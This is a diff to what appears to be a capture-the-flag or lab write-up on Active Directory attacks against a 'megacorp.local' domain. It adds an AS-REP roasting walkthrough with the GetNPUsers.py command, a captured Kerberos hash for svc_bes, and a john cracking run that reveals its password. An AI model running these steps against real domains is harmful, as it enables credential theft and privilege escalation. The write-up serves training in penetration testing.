@@ -13,6 +13,10 @@ tags:
   - neo4j
   - bloodhound-python
   - bloodhound
+  - ASREPRoasting
+  - impackets
+  - john
+  - GetNPUser
 ---
 
 Here are notes from the named target:
@@ -270,16 +274,42 @@ and Find Principles with DCSync Rights
 
 We can see that the svc_bes has GetChangesAll privileges to the domain. This means that the account has the ability to request replication data from the domain controller, and gain sensitive information such as user hashes.
 
-We always look for accounts vuln to ASREPRoasting - In Bloodhound Analysis run the last query "Find AS-REP Roastable Users (DontReqPreAuth)"
+We always look for [accounts vuln to ASREPRoasting][roasting] - In Bloodhound Analysis run the last query "Find AS-REP Roastable Users (DontReqPreAuth)"
 With those we can request their password TGT hash using:
 
 ```yaml
 GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30
 ```
+Reinstall impackets if it does not work [Install Impackets here][impackets]
+
+```yaml
+┌──(kali㉿kali)-[~]
+└─$ GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30
+Impacket v0.9.23.dev1+20210108.113210.1dec03a4 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for svc_bes
+$krb5asrep$23$svc_bes@MEGACORP.LOCAL:553634acae3813c63f4377073993bf0d$245cd75bee2cdf6827818b504b134a6e79f1890c9cec01cbe53f564d1844814c21598c7b2b3d986c036e292184391117f89cfb1afbc9d0054f414fefe9b33564975d769ccd35bc924474ba90e7dbb77cdce701fd162c6076c7aacf7210610462a5812728d69c874d711610d8071b370cb067f35db518412777c0993f479f98f9d0f9c89396677fbc6f0c3767d86bf4a2288f81d71001245f530cbf48a843e8abf31629feb18c6be4e138526edbe4f23f9da74812e960fb770e24148b1ed80fdf6dd53e9b1ed0e3ce13afe3e86dd766fcc74f84a24c492a142ce335560fe18e91a6dbac4062d2e02c7f3e30624d2f2cab
+
+```
+With hash of password for account svc_bes we can crack it with john the ripper or simply john. Copy the hash into a file called hash and then use john and rockyou to crack it.
+
+```yaml
+┌──(kali㉿kali)-[~]
+└─$ john hash -wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Sheffield19      ($krb5asrep$23$svc_bes@MEGACORP.LOCAL)
+1g 0:00:00:07 DONE (2021-01-08 14:10) 0.1410g/s 1495Kp/s 1495Kc/s 1495KC/s Sherbear94..Sheepy04
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
 
 
 
 
 [AD-Recon]: https://exploit.ph/active-directory-recon-1.html
 [blood-info]: https://github.com/BloodHoundAD/BloodHound
+[impackets]: https://rootsecdev.medium.com/installing-impacket-on-kali-linux-2020-1d9ad69d10bb
+[roasting]: https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/
 
